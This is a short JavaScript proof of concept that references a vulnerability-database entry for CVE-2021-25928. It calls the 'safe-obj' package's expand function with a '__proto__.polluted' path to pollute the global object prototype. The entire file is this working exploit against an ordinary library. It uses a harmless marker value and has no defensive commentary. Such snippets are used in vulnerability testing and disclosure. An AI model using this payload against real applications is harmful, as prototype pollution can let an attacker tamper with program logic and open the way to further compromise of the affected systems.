//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25928
    var safeObj = require("safe-obj")
    obj = {}
    
    safeObj. expand (obj,'__proto__.polluted','yes'); 
  